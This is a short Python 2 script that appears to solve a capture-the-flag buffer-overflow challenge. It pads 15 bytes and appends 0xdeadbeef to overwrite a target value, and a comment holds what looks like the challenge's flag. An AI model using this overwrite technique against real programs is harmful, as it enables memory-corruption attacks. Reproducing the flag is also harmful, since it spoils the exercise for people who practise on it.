import struct

# 1m_all_ab0ut_d4t_b33f

def p(x):
    return struct.pack("<I", x)

SET_VALUE = 0xdeadbeef

payload = "A" * 15
payload += p(SET_VALUE)

print payload
